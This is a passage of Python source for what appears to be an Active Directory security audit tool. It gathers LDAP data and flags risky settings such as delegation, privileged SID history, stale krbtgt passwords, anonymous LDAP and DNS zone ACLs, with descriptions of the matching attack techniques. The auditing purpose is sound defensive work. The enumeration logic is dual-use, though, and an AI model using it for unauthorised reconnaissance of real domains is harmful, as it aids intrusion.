                search_filter=flt,
                search_scope=scope,
                attributes=attrs,
                paged_size=page_size,
                generator=True)
            for entry in gen:
                if entry.get("type") == "searchResEntry":
                    results.append({"dn": entry["dn"],
                                    "attrs": entry["attributes"]})
        except LDAPException as e:
            if self.args.verbose:
                print(f"[!] LDAP search error ({base}, {flt}): {e}")
        return results

    def search_one(self, base: str, flt: str, attrs: List[str]) -> Optional[Dict]:
        r = self.paged_search(base, flt, attrs, page_size=5)
        return r[0] if r else None

# ─────────────────────────────────────────────────────────────────────────────
# AD DATA COLLECTOR
# ─────────────────────────────────────────────────────────────────────────────

class ADData:
    """Single collection pass — all LDAP data needed by checks."""

    def __init__(self, conn: ADConnection, args):
        self.conn  = conn
        self.args  = args
        self.base  = conn.base_dn
        self.cfg   = conn.cfg_nc
        self.sch   = conn.sch_nc

        # populated by collect()
        self.domain_obj:    Optional[Dict] = None
        self.users:         List[Dict] = []
        self.computers:     List[Dict] = []
        self.groups:        Dict[str, Dict] = {}   # sAMAccountName lower -> attrs
        self.dcs:           List[Dict] = []
        self.rodcs:         List[Dict] = []
        self.trusts:        List[Dict] = []
        self.gpos:          List[Dict] = []
        self.sites:         List[Dict] = []
        self.subnets:       List[Dict] = []
        self.psoes:         List[Dict] = []
        self.cert_templates:List[Dict] = []
        self.enrollment_svcs:List[Dict] = []
        self.dns_zones:     List[Dict] = []
        self.schema_version: int = 0
        self.forest_level:   int = -1
        self.domain_level:   int = -1
        self.krbtgt:        Optional[Dict] = None
        self.guest:         Optional[Dict] = None
        self.pre_win2000:   Optional[Dict] = None
        self.protected_users:Optional[Dict] = None
        self.admin_sd_holder:Optional[Dict] = None
        self.priv_group_members: Dict[str, List[str]] = {}
        self.laps_installed: bool = False
        self.adws_available: bool = False
        self.ds_heuristics:  str  = ""
        self.ms_ds_other_settings: str = ""
        # populated by SYSVOLChecker
        self.sysvol_data: Dict = {
            "gpp_passwords": [],       # [{gpo_name, file, username, cpassword, plaintext}]
            "registry_pol":  [],       # [{gpo_name, key, name, regtype, data}]
            "inf_settings":  [],       # [{gpo_name, section, key, value}]
            "gpo_files":     [],       # raw file paths found
        }
        # populated by ACLAnalyzer
        self.acl_findings: List[Dict] = []
        self.machine_account_quota: int = -1

    def collect(self):
        c = self.conn
        print("[*] Collecting domain information...")
        self._collect_domain_info()
        print("[*] Collecting user accounts...")
        self._collect_users()
        print("[*] Collecting computer accounts...")
        self._collect_computers()
        print("[*] Collecting groups...")
        self._collect_groups()
        print("[*] Collecting domain controllers...")
        self._collect_dcs()
        print("[*] Collecting trust relationships...")
        self._collect_trusts()
        print("[*] Collecting GPOs...")
        self._collect_gpos()
        print("[*] Collecting sites/subnets...")
        self._collect_sites()
        print("[*] Collecting password settings objects...")
        self._collect_psoes()
        if not self.args.no_adcs:
            print("[*] Collecting ADCS objects...")
            self._collect_adcs()
        print("[*] Collecting DNS zones...")
        self._collect_dns()
        print("[*] Checking ADWS availability...")
        self.adws_available = check_port(self.args.dc_ip, 9389, timeout=3)
        print("[*] Data collection complete.")

    # ── domain ───────────────────────────────────────────────────────────────

    def _collect_domain_info(self):
        c = self.conn
        # Root DSE already fetched; read domain object
        r = c.search_one(self.base, "(objectClass=domain)", [
            "minPwdLength","maxPwdAge","minPwdAge","pwdProperties",
            "pwdHistoryLength","lockoutThreshold","lockoutDuration",
            "lockoutObservationWindow","ms-DS-MachineAccountQuota",
            "nTMixedDomain","objectSid","msDS-Behavior-Version",
            "gPLink","gPOptions","distinguishedName","dc","name",
            "wellKnownObjects","otherWellKnownObjects",
        ])
        self.domain_obj = r

        # Functional levels from rootDSE other
        info = c.server.info
        if info:
            def _lvl(key):
                v = info.other.get(key, [None])
                v = v[0] if isinstance(v, list) else v
                try:
                    return int(v)
                except (TypeError, ValueError):
                    return -1
            self.domain_level  = _lvl("domainFunctionality")
            self.forest_level  = _lvl("forestFunctionality")

        # Schema version
        sv = c.search_one(self.sch, "(objectClass=dMD)", ["objectVersion"])
        if sv:
            self.schema_version = get_int(sv["attrs"], "objectVersion")

        # ds-heuristics (on Directory Service object)
        ds_obj = c.search_one(
            f"CN=Directory Service,CN=Windows NT,CN=Services,{self.cfg}",
            "(objectClass=nTDSService)",
            ["dSHeuristics","msDS-Other-Settings"])
        if ds_obj:
            self.ds_heuristics = get_str(ds_obj["attrs"], "dSHeuristics")
            self.ms_ds_other_settings = get_str(ds_obj["attrs"], "msDS-Other-Settings")

        # krbtgt
        self.krbtgt = c.search_one(self.base, "(sAMAccountName=krbtgt)", [
            "pwdLastSet","whenCreated","whenChanged","userAccountControl",
            "distinguishedName","msDS-SupportedEncryptionTypes"])

        # guest
        self.guest = c.search_one(self.base, "(sAMAccountName=Guest)", [
            "userAccountControl","pwdLastSet","distinguishedName"])

        # pre-win2000 compat access group
        self.pre_win2000 = c.search_one(
            self.base, "(sAMAccountName=Pre-Windows 2000 Compatible Access)",
            ["member","objectSid","distinguishedName"])

        # protected users
        self.protected_users = c.search_one(
            self.base, "(sAMAccountName=Protected Users)",
            ["member","distinguishedName"])

        # AdminSDHolder
        self.admin_sd_holder = c.search_one(
            f"CN=System,{self.base}", "(cn=AdminSDHolder)",
            ["nTSecurityDescriptor","distinguishedName"])

        # Machine account quota
        if self.domain_obj:
            self.machine_account_quota = get_int(
                self.domain_obj["attrs"], "ms-DS-MachineAccountQuota", -1)

        # LAPS schema check
        laps_attr = c.search_one(self.sch,
            "(lDAPDisplayName=ms-Mcs-AdmPwd)", ["lDAPDisplayName"])
        if not laps_attr:
            laps_attr = c.search_one(self.sch,
                "(lDAPDisplayName=msLAPS-Password)", ["lDAPDisplayName"])
        self.laps_installed = laps_attr is not None

    # ── users ────────────────────────────────────────────────────────────────

    def _collect_users(self):
        self.users = self.conn.paged_search(self.base,
            "(&(objectClass=user)(objectCategory=person))", [
            "sAMAccountName","userAccountControl","pwdLastSet",
            "lastLogonTimestamp","adminCount","memberOf",
            "servicePrincipalName","sIDHistory","msDS-SupportedEncryptionTypes",
            "mail","distinguishedName","userPrincipalName","description",
            "whenCreated","accountExpires","badPasswordTime","badPwdCount",
            "msDS-AllowedToDelegateTo","msDS-AllowedToActOnBehalfOfOtherIdentity",
            "primaryGroupID","objectSid","name","displayName"])

    # ── computers ────────────────────────────────────────────────────────────

    def _collect_computers(self):
        self.computers = self.conn.paged_search(self.base,
            "(objectClass=computer)", [
            "sAMAccountName","userAccountControl","pwdLastSet",
            "lastLogonTimestamp","operatingSystem","operatingSystemVersion",
            "dNSHostName","servicePrincipalName","adminCount",
            "msDS-SupportedEncryptionTypes","sIDHistory",
            "msDS-AllowedToDelegateTo","msDS-AllowedToActOnBehalfOfOtherIdentity",
            "ms-Mcs-AdmPwdExpirationTime","msLAPS-PasswordExpirationTime",
            "distinguishedName","msDS-IsRODC","primaryGroupID","whenCreated",
            "objectSid","name","dNSHostName"])

    # ── groups ────────────────────────────────────────────────────────────────

    PRIV_GROUPS = [
        "Domain Admins","Schema Admins","Enterprise Admins","Administrators",
        "Group Policy Creator Owners","DNSAdmins","Account Operators",
        "Backup Operators","Server Operators","Print Operators",
        "Pre-Windows 2000 Compatible Access","Protected Users",
        "Remote Management Users","DnsAdmins",
        "Cert Publishers","Key Admins","Enterprise Key Admins",
        "Exchange Windows Permissions","Exchange Trusted Subsystem",
    ]

    def _collect_groups(self):
        raw = self.conn.paged_search(self.base, "(objectClass=group)", [
            "sAMAccountName","member","memberOf","groupType",
            "adminCount","objectSid","distinguishedName","description",
            "name"])
        for g in raw:
            name = get_str(g["attrs"], "sAMAccountName").lower()
            self.groups[name] = g

        # Build a primaryGroupID -> [accounts] index once. Primary-group
        # membership is NOT stored in the group's `member` attribute, so the
        # recursive in-chain query below misses it (a known AD blind spot used
        # both legitimately and as an evasion). We fold it back in per group.
        pg_index: Dict[int, List[Dict]] = defaultdict(list)
        for obj in self.users + self.computers:
            pgid = get_int(obj["attrs"], "primaryGroupID", 0)
            if pgid:
                pg_index[pgid].append(obj)

        # privileged group membership (recursive via LDAP_MATCHING_RULE_IN_CHAIN)
        for gname in self.PRIV_GROUPS:
            gr = self.groups.get(gname.lower())
            if not gr:
                continue
            gdn = gr["dn"]
            members = self.conn.paged_search(self.base,
                f"(memberOf:1.2.840.113556.1.4.1941:={gdn})",
                ["sAMAccountName","distinguishedName","userAccountControl",
                 "pwdLastSet","lastLogonTimestamp","servicePrincipalName"])
            seen = {m["dn"] for m in members}
            # add accounts whose PRIMARY group RID matches this group
            grp_rid = None
            sid = sid_to_str(gr["attrs"].get("objectSid", [b""])[0]
                             if isinstance(gr["attrs"].get("objectSid"), list)
                             else gr["attrs"].get("objectSid"))
            try:
                grp_rid = int(sid.rsplit("-", 1)[1]) if sid.startswith("S-") else None
            except (ValueError, IndexError):
                grp_rid = None
            if grp_rid is not None:
                for obj in pg_index.get(grp_rid, []):
                    if obj["dn"] not in seen:
                        members.append(obj)
                        seen.add(obj["dn"])
            self.priv_group_members[gname] = members

    # ── domain controllers ───────────────────────────────────────────────────

    def _collect_dcs(self):
        # DCs from computers with SERVER_TRUST bit
        self.dcs = self.conn.paged_search(self.base,
            "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))", [
            "sAMAccountName","dNSHostName","operatingSystem","operatingSystemVersion",
            "pwdLastSet","lastLogonTimestamp","userAccountControl",
            "msDS-IsRODC","distinguishedName","whenCreated","objectSid"])

        # RODC via nTDSDSA objects
        self.rodcs = self.conn.paged_search(
            f"CN=Sites,{self.cfg}",
            "(objectClass=nTDSDSA)",
            ["distinguishedName","msDS-IsRODC",
             "msDS-NeverRevealGroup","msDS-RevealOnDemandGroup"])

    # ── trusts ────────────────────────────────────────────────────────────────

    def _collect_trusts(self):
        self.trusts = self.conn.paged_search(self.base,
            "(objectClass=trustedDomain)", [
            "name","flatName","securityIdentifier","trustAttributes",
            "trustDirection","trustType","trustPartner",
            "whenCreated","whenChanged","distinguishedName"])

    # ── GPOs ──────────────────────────────────────────────────────────────────

    def _collect_gpos(self):
        self.gpos = self.conn.paged_search(self.base,
            "(objectClass=groupPolicyContainer)", [
            "displayName","gPCFileSysPath","flags","versionNumber",
            "gPCFunctionalityVersion","distinguishedName","whenChanged",
            "cn"])

    # ── sites / subnets ───────────────────────────────────────────────────────

    def _collect_sites(self):
        self.sites = self.conn.paged_search(
            f"CN=Sites,{self.cfg}",
            "(objectClass=site)", ["cn","distinguishedName"])
        self.subnets = self.conn.paged_search(
            f"CN=Subnets,CN=Sites,{self.cfg}",
            "(objectClass=subnet)", ["cn","siteObject","description"])

    # ── fine-grained PSOs ────────────────────────────────────────────────────

    def _collect_psoes(self):
        self.psoes = self.conn.paged_search(
            f"CN=Password Settings Container,CN=System,{self.base}",
            "(objectClass=msDS-PasswordSettings)", [
            "cn","msDS-MinimumPasswordLength","msDS-PasswordComplexityEnabled",
            "msDS-MaximumPasswordAge","msDS-LockoutThreshold",
            "msDS-AppliesTo","msDS-PasswordHistoryLength",
            "msDS-PSOAppliesTo"])

    # ── ADCS ─────────────────────────────────────────────────────────────────

    def _collect_adcs(self):
        pks_base = f"CN=Public Key Services,CN=Services,{self.cfg}"
        self.cert_templates = self.conn.paged_search(
            f"CN=Certificate Templates,{pks_base}",
            "(objectClass=pKICertificateTemplate)", [
            "cn","displayName","msPKI-Certificate-Name-Flag",
            "msPKI-Enrollment-Flag","msPKI-RA-Signature",
            "pKIExtendedKeyUsage","nTSecurityDescriptor",
            "msPKI-Private-Key-Flag","msPKI-Template-Schema-Version",
            "msPKI-Cert-Template-OID","flags"])
        self.enrollment_svcs = self.conn.paged_search(
            f"CN=Enrollment Services,{pks_base}",
            "(objectClass=pKIEnrollmentService)", [
            "cn","dNSHostName","cACertificate","distinguishedName",
            "certificateTemplates","msPKI-Enrollment-Servers"])
        # Build set of template names actually published to a CA
        self._published_templates: Set[str] = set()
        for svc in self.enrollment_svcs:
            for tname in get_list(svc["attrs"], "certificateTemplates"):
                self._published_templates.add(tname.strip())

    # ── DNS ───────────────────────────────────────────────────────────────────

    def _collect_dns(self):
        for dns_base in [
            f"CN=MicrosoftDNS,DC=DomainDnsZones,{self.base}",
            f"CN=MicrosoftDNS,DC=ForestDnsZones,{self.base}",
            f"CN=MicrosoftDNS,CN=System,{self.base}",
        ]:
            zones = self.conn.paged_search(
                dns_base, "(objectClass=dnsZone)", [
                "name","dnsProperty","distinguishedName"])
            self.dns_zones.extend(zones)


# ─────────────────────────────────────────────────────────────────────────────
# CHECK ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class CheckEngine:
    """Runs all checks against collected ADData and returns a list of Findings."""

    def __init__(self, data: ADData, args):
        self.d     = data
        self.args  = args
        self.findings: List[Finding] = []
        self._now  = datetime.datetime.now(tz=datetime.timezone.utc)

    def _rule(self, rule_id: str) -> Tuple[str, str, int, str]:
        return RULES.get(rule_id, (rule_id, "Anomaly", 5, "MEDIUM"))

    def _add(self, rule_id: str, details: str = "", affected: List[str] = None):
        t, cat, pts, sev = self._rule(rule_id)
        aff = _dedup_keep_order(affected or [])
        self.findings.append(Finding(
            rule_id=rule_id, title=t, category=cat,
            points=scaled_points(rule_id, pts, len(aff)), severity=sev,
            details=details, affected=aff,
            maturity=rule_maturity(rule_id, sev),
            mitre=RULE_MITRE.get(rule_id, [])))

    def run_all(self):
        self._check_anomaly()
        self._check_privileged()
        self._check_stale()
        self._check_trust()
        self._check_gpo_sysvol()
        self._check_acl()
        self._check_extra()
        self._check_modern()

    # =========================================================================
    # MODERN ESCALATION CHECKS (v2)  — RBCD, constrained delegation, computer
    # accounts in privileged groups, orphaned adminCount, privileged SID history
    # =========================================================================

    def _check_modern(self):
        self._m_rbcd()
        self._m_constrained_delegation()
        self._m_computer_in_priv_group()
        self._m_admincount_orphan()
        self._m_sidhistory_privileged()

    # privileged RIDs and well-known built-in SIDs that must never appear in
    # an account's SID history (classic stealth-persistence backdoor).
    _PRIV_RIDS = {512, 516, 518, 519, 520, 521, 526, 527}
    _PRIV_BUILTIN = {
        "S-1-5-32-544": "Administrators", "S-1-5-32-548": "Account Operators",
        "S-1-5-32-549": "Server Operators", "S-1-5-32-550": "Print Operators",
        "S-1-5-32-551": "Backup Operators", "S-1-5-32-552": "Replicators",
        "S-1-5-32-557": "Incoming Forest Trust Builders",
    }
    # Groups whose membership by a *computer* account is a real escalation.
    _SENSITIVE_GROUPS = {
        "domain admins", "enterprise admins", "schema admins", "administrators",
        "account operators", "backup operators", "server operators",
        "print operators", "group policy creator owners", "key admins",
        "enterprise key admins", "dnsadmins",
    }

    def _is_dc(self, dn: str) -> bool:
        dcdns = {d["dn"] for d in self.d.dcs}
        return dn in dcdns

    def _m_rbcd(self):
        dc_dns = {d["dn"] for d in self.d.dcs}
        normal, dangerous = [], []
        for obj in self.d.users + self.d.computers:
            a = obj["attrs"]
            if not get_list(a, "msDS-AllowedToActOnBehalfOfOtherIdentity") \
               and not get_str(a, "msDS-AllowedToActOnBehalfOfOtherIdentity"):
                continue
            sam = get_str(a, "sAMAccountName")
            if obj["dn"] in dc_dns:
                dangerous.append(sam)
            else:
                normal.append(sam)
        if dangerous:
            self._add("P-RBCD-Dangerous",
                      "Resource-based constrained delegation is configured on a "
                      "domain controller object. Anyone able to write that SD can "
                      "impersonate any user to the DC (instant domain compromise).",
                      dangerous)
        if normal:
            self._add("P-RBCD",
                      "These accounts have msDS-AllowedToActOnBehalfOfOtherIdentity "
                      "set (resource-based constrained delegation). If an attacker "
                      "controls an allowed principal (or can add one via "
                      "MachineAccountQuota) they impersonate any user to the host. "
                      "Validate every configured delegation.",
                      normal)

    def _m_constrained_delegation(self):
        dc_dns = {d["dn"] for d in self.d.dcs}
        affected = []
        for obj in self.d.users + self.d.computers:
            a = obj["attrs"]
            targets = get_list(a, "msDS-AllowedToDelegateTo")
            if not targets or obj["dn"] in dc_dns:
                continue
            uac = get_int(a, "userAccountControl")
            sam = get_str(a, "sAMAccountName")
            # protocol transition (T2A4D) is the more dangerous variant
            transition = uac_has(uac, UAC_TRUSTED_TO_AUTH)
            tag = "+T2A4D" if transition else ""
            affected.append(f"{sam}{tag} -> {', '.join(sorted(set(targets))[:4])}")
        if affected:
            self._add("P-ConstrainedDelegService",
                      "Service accounts with constrained delegation (msDS-Allowed"
                      "ToDelegateTo). Compromise of the account allows S4U2Proxy "
                      "impersonation to the listed SPNs; '+T2A4D' marks protocol-"
                      "transition (any user can be impersonated).",
                      affected)

    def _m_computer_in_priv_group(self):
        affected = []
        for gname, members in self.d.priv_group_members.items():
            if gname.lower() not in self._SENSITIVE_GROUPS:
                continue
            for m in members:
                sam = get_str(m["attrs"], "sAMAccountName")
                uac = get_int(m["attrs"], "userAccountControl")
                is_machine = sam.endswith("$") or uac_has(uac, UAC_WORKSTATION_TRUST) \
                             or uac_has(uac, UAC_SERVER_TRUST)
                if is_machine and not self._is_dc(m["dn"]):
                    affected.append(f"{sam} in {gname}")
        if affected:
            self._add("P-ComputerInPrivGroup",
                      "Computer accounts are members of privileged groups. Whoever "
                      "controls SYSTEM on that machine (or its computer secret) "
                      "inherits the group's domain privileges.",
                      affected)

    def _m_admincount_orphan(self):
        protected = {m["dn"] for members in self.d.priv_group_members.values()
                     for m in members}
        if self.d.krbtgt:
            protected.add(self.d.krbtgt.get("dn", ""))
        affected = []
        for obj in self.d.users + self.d.computers:
            a = obj["attrs"]
            if get_int(a, "adminCount") != 1:
                continue
            if obj["dn"] in protected:
                continue
            affected.append(get_str(a, "sAMAccountName") or dn_base(obj["dn"]))
        if affected:
            self._add("P-AdminCountOrphan",
                      "Objects carry adminCount=1 but are not currently in a "
                      "protected group. They retain restrictive AdminSDHolder ACLs "
                      "and indicate former privilege — review and clear adminCount "
                      "(and reset inheritance) on legitimately-demoted accounts.",
                      affected)

    def _m_sidhistory_privileged(self):
        affected = []
        for obj in self.d.users + self.d.computers:
            a = obj["attrs"]
            raw_vals = a.get("sIDHistory") or a.get("sidHistory") or []
            if not isinstance(raw_vals, list):
                raw_vals = [raw_vals]
            sam = get_str(a, "sAMAccountName")
            for v in raw_vals:
                s = v if (isinstance(v, str) and v.startswith("S-")) else sid_to_str(v)
                if not s or not s.startswith("S-"):
                    continue
                rid = None
                try:
                    rid = int(s.rsplit("-", 1)[1])
                except (ValueError, IndexError):
                    pass
                if (rid in self._PRIV_RIDS or rid == 500
                        or s in self._PRIV_BUILTIN):
                    label = self._PRIV_BUILTIN.get(s, f"RID {rid}")
                    affected.append(f"{sam} <- {s} ({label})")
        if affected:
            self._add("S-SIDHistoryPrivileged",
                      "Accounts carry a privileged/built-in SID in their SID "
                      "history. This is a classic stealth backdoor: the account "
                      "wields admin rights without being a visible group member. "
                      "Remove the SID history and rotate krbtgt twice.",
                      affected)

    # =========================================================================
    # ANOMALY CHECKS (A-)
    # =========================================================================

    def _check_anomaly(self):
        self._a_krbtgt()
        self._a_guest()
        self._a_pre_win2000()
        self._a_null_session_ldap()
        self._a_root_dse_anon()
        self._a_ds_heuristics()
        self._a_laps()
        self._a_min_pwd_len()
        self._a_reversible_pwd()
        self._a_lm_hash()
        self._a_protected_users_usage()
        self._a_dns_zones()
        self._a_not_enough_dc()
        self._a_ntfrs_sysvol()
        self._a_adcs_checks()
        self._a_member_everyone()
        self._a_bad_successor()
        self._a_dc_spooler_webclient()
        self._a_smart_card_rotation()
        self._a_admin_sd_holder()
        self._a_pwd_gpo()
        self._a_audit_powershell()

    def _a_krbtgt(self):
        k = self.d.krbtgt
        if not k:
            return
        pls = filetime_to_dt(get_int(k["attrs"], "pwdLastSet"))
        age = days_since(pls)
        if pls is None:
            self._add("A-Krbtgt",
                      "krbtgt password has NEVER been changed — "
                      "any Golden Ticket issued against the old hash is valid forever.",
                      ["krbtgt"])
        elif age is not None and age > 180:
            self._add("A-Krbtgt",
                      f"krbtgt password last changed {age} days ago (threshold: 180). "
                      "Old Kerberos Golden Tickets remain valid.",
                      [f"krbtgt (last changed {age} days ago)"])

    def _a_guest(self):
        g = self.d.guest
        if not g:
            return
        uac = get_int(g["attrs"], "userAccountControl")
        if not uac_has(uac, UAC_ACCOUNTDISABLE):
            self._add("A-Guest",
                      "The built-in Guest account is enabled. "
                      "Attackers can authenticate without credentials.",
                      ["Guest"])

    def _a_pre_win2000(self):
        pw = self.d.pre_win2000
        if not pw:
            return
        members = get_list(pw["attrs"], "member")
        if not members:
            return
        anon_sids  = {"S-1-5-7", "S-1-1-0"}   # Anonymous Logon, Everyone
        auth_users = "S-1-5-11"
        anon_found, auth_found, other = [], [], []
        for m in members:
            ml = m.lower()
            if "anonymous" in ml or "s-1-5-7" in ml:
                anon_found.append(m)
            elif "authenticated users" in ml or "s-1-5-11" in ml:
                auth_found.append(m)
            elif "everyone" in ml or "s-1-1-0" in ml:
                anon_found.append(m)
            else:
                other.append(m)
        if anon_found:
            self._add("A-PreWin2000Anonymous",
                      "Anonymous/Everyone is member of Pre-Windows 2000 Compatible Access "
                      "— unauthenticated LDAP enumeration may be possible.",
                      anon_found)
        if auth_found:
            self._add("A-PreWin2000AuthenticatedUsers",
                      "Authenticated Users is member of Pre-Windows 2000 Compatible Access "
                      "— any domain user can enumerate sensitive LDAP attributes.",
                      auth_found)
        if other:
            self._add("A-PreWin2000Other",
                      "Pre-Windows 2000 Compatible Access group has unexpected members.",
                      other)

    def _a_null_session_ldap(self):
        # An anonymous LDAP bind always succeeds at the protocol level in AD.
        # We only flag this if the anonymous session can actually *read* directory objects
        # (e.g., user/computer accounts) — that is a genuine misconfiguration.
        # Simply binding as anonymous and reading rootDSE is normal behaviour.
        try:
            srv = Server(self.args.dc_ip, port=389, get_info=ALL, connect_timeout=5)
            tc  = Connection(srv, auto_bind=True)
            if not tc.bound:
                return
            # Try to search the domain root for any object — non-empty result = misconfigured
            base = self.d.base if self.d.base else ""
            tc.search(base, "(objectClass=user)",
                      ldap3.SUBTREE,
                      attributes=["sAMAccountName"],
                      size_limit=1)
            got_data = bool(tc.entries)
            tc.unbind()
            if got_data:
                self._add("A-NullSession",
                          f"Anonymous LDAP bind can enumerate domain objects on {self.args.dc_ip}:389. "
                          "This is a serious misconfiguration — unauthenticated enumeration of all "
                          "users, computers and groups is possible. "
                          "Restrict via dsHeuristics or block anonymous LDAP at the firewall.",
                          [f"{self.args.dc_ip}:389"])
        except Exception:
            pass

    def _a_root_dse_anon(self):
        # rootDSE is publicly readable on all AD servers by design (RFC 4512).
        # This is expected behaviour, not a vulnerability; skip to avoid noise.
        pass

    def _a_ds_heuristics(self):
        h = self.d.ds_heuristics
        if not h:
            return
        # Position 7 (1-indexed) controls anonymous LDAP
        def pos(n):
            return h[n-1] if len(h) >= n else "0"
        if pos(7) == "2":
            self._add("A-DsHeuristicsAnonymous",
                      "dSHeuristics position 7 = '2': anonymous LDAP operations enabled.",
                      [f"dSHeuristics={h}"])
        if pos(3) == "1":
            self._add("A-DsHeuristicsAllowAnonNSPI",
                      "dSHeuristics position 3 = '1': anonymous NSPI access allowed.",
                      [f"dSHeuristics={h}"])
        # LDAP security (position 7 must not allow relay)
        ldap_sec = self.d.ms_ds_other_settings
        if ldap_sec and "LDAPAddAutZVerifications" in ldap_sec:
            self._add("A-DsHeuristicsLDAPSecurity",
                      "msDS-Other-Settings may have CVE-2021-42291 mitigations disabled.",
                      [f"msDS-Other-Settings: {ldap_sec[:100]}"])

    def _a_laps(self):
        if not self.d.laps_installed:
            self._add("A-LAPS-Not-Installed",
                      "LAPS schema attribute (ms-Mcs-AdmPwd or msLAPS-Password) not found. "
                      "Local administrator passwords are not managed centrally.",
                      [])
            return
        # Check which computers have no LAPS expiration set (password not stored)
        no_laps = []
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            # Skip DCs
            if uac_has(uac, UAC_SERVER_TRUST):
                continue
            has_exp = (get_str(comp["attrs"], "ms-Mcs-AdmPwdExpirationTime") or
                       get_str(comp["attrs"], "msLAPS-PasswordExpirationTime"))
            if not has_exp or has_exp == "0":
                no_laps.append(get_str(comp["attrs"], "dNSHostName") or
                               get_str(comp["attrs"], "sAMAccountName"))
        if len(no_laps) > 0:
            self._add("A-LAPS-Joined-Computers",
                      f"{len(no_laps)} enabled workstation/server accounts have no LAPS "
                      "password set (or LAPS never ran on them).",
                      no_laps[:20])

    def _a_min_pwd_len(self):
        if not self.d.domain_obj:
            return
        mpl = get_int(self.d.domain_obj["attrs"], "minPwdLength")
        if mpl < 8:
            self._add("A-MinPwdLen",
                      f"Domain minimum password length is {mpl} characters (recommended ≥ 8). "
                      "Weak passwords are allowed by policy.",
                      [f"minPwdLength={mpl}"])

    def _a_reversible_pwd(self):
        affected = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ENCRYPTED_TEXT_PWD):
                if not uac_has(uac, UAC_ACCOUNTDISABLE):
                    affected.append(get_str(u["attrs"], "sAMAccountName"))
        if affected:
            self._add("A-ReversiblePwd",
                      f"{len(affected)} enabled user account(s) store passwords with "
                      "reversible encryption — equivalent to cleartext.",
                      affected[:30])

    def _a_lm_hash(self):
        if not self.d.domain_obj:
            return
        # pwdProperties bit 2 = DOMAIN_PASSWORD_NO_CLEAR_CHANGE
        # bit 1 = DOMAIN_PASSWORD_STORE_CLEARTEXT (reversible)
        # LM hash disabled by NoLMHash policy — need to check GPO
        # We can infer via domain pwdProperties bit 4 (DOMAIN_REFUSE_PASSWORD_CHANGE is bit 6)
        # Actual LM hash GPO is a registry setting — check if we can detect it
        # via domain object or defer to SMB checks
        # Check domain functional level as proxy: if DFL >= 2003, LM should be off
        # but we flag if DFL is old OR if we see evidence
        if self.d.domain_level is not None and self.d.domain_level < 2:
            self._add("A-LMHashAuthorized",
                      "Domain functional level suggests LM hash storage may be active. "
                      "Verify the 'Network security: Do not store LAN Manager hash' GPO.",
                      [f"Domain functional level: {FUNCTIONAL_LEVELS.get(self.d.domain_level)}"])

    def _a_protected_users_usage(self):
        pu = self.d.protected_users
        pu_members = set()
        if pu:
            for m in get_list(pu["attrs"], "member"):
                pu_members.add(m.lower())
        # Check if all domain admin members are in Protected Users
        da_members = self.d.priv_group_members.get("Domain Admins", [])
        not_protected = []
        for m in da_members:
            dn = m.get("dn", "").lower()
            if dn and dn not in pu_members:
                sam = get_str(m["attrs"], "sAMAccountName")
                uac = get_int(m["attrs"], "userAccountControl")
                if not uac_has(uac, UAC_ACCOUNTDISABLE):
                    not_protected.append(sam)
        if not_protected:
            self._add("A-ProtectedUsers",
                      f"{len(not_protected)} Domain Admin account(s) are not members of "
                      "Protected Users — they are susceptible to credential theft.",
                      not_protected[:20])

    def _a_dns_zones(self):
        """Flag DNS zones whose nTSecurityDescriptor grants CreateChild to
        Authenticated Users (default on AD-integrated zones — enables ADIDNS
        poisoning). Skipped when we cannot read the SD or no evidence exists.
        """
        if not HAS_IMPACKET_LDAP:
            return
        AU_SID  = "S-1-5-11"
        EV_SID  = "S-1-1-0"
        risky_zones: List[str] = []
        for z in self.d.dns_zones:
            zname = get_str(z["attrs"], "name") or z["dn"]
            # Re-fetch zone with SACL/DACL flags so the DACL is actually returned
            try:
                ctl = security_descriptor_control(sdflags=0x07)
                self.d.conn.conn.search(
                    z["dn"], "(objectClass=*)",
                    attributes=["nTSecurityDescriptor"],
                    controls=ctl)
                entries = self.d.conn.conn.entries
                if not entries:
                    continue
                sd_raw = entries[0]["nTSecurityDescriptor"].raw_values
                if not sd_raw:
                    continue
                sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_raw[0])
                dacl = sd["Dacl"]
                if not dacl:
                    continue
                for ace in dacl["Data"]:
                    sid = ace["Ace"]["Sid"].formatCanonical()
                    if sid not in (AU_SID, EV_SID):
                        continue
                    mask = ace["Ace"]["Mask"]["Mask"]
                    # ADS_RIGHT_DS_CREATE_CHILD = 0x1, GenericAll = 0xF01FF
                    if mask & 0x1 or mask & 0xF01FF:
                        risky_zones.append(zname)
                        break
            except Exception:
                continue
        if risky_zones:
            self._add("A-DnsZoneAUCreateChild",
                      "DNS zone(s) grant CreateChild (or higher) to Authenticated Users / "
                      "Everyone — any domain user can register A/CNAME records (ADIDNS) and "
                      "stage Responder-style spoofing for wpad, file servers, etc.",
                      risky_zones)

    def _a_not_enough_dc(self):
        active_dcs = [d for d in self.d.dcs
                      if not uac_has(get_int(d["attrs"], "userAccountControl"),
                                     UAC_ACCOUNTDISABLE)]
        if len(active_dcs) < 2:
            self._add("A-NotEnoughDC",
                      f"Only {len(active_dcs)} domain controller(s) found. "
                      "Single DC is a single point of failure.",
                      [get_str(d["attrs"], "dNSHostName") for d in active_dcs])

    def _a_ntfrs_sysvol(self):
        # Check msDS-NcType or FRS service registration
        frs_sets = self.d.conn.paged_search(
            self.d.cfg,
            "(objectClass=nTFRSReplicaSet)",
            ["name","distinguishedName"])
        if frs_sets:
            names = [get_str(f["attrs"], "name") for f in frs_sets]
            self._add("A-NTFRSOnSysvol",
                      "NTFRS replica sets found — SYSVOL replication may still use "
                      "deprecated FRS instead of DFSR. This is a security and stability risk.",
                      names)

    # EKUs that make a certificate useful for domain authentication (ESC1 prereq)
    _AUTH_EKUS = {
        "1.3.6.1.5.5.7.3.2",          # Client Authentication
        "1.3.6.1.4.1.311.20.2.2",     # Smart Card Logon
        "1.3.6.1.5.2.3.4",            # PKINIT Client Auth
        "2.5.29.37.0",                 # Any Purpose
    }
    _ANY_PURPOSE_OID       = "2.5.29.37.0"
    _CERT_REQUEST_AGENT    = "1.3.6.1.4.1.311.20.2.1"

    # msPKI-Certificate-Name-Flag bits
    _CT_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
    # msPKI-Enrollment-Flag bits
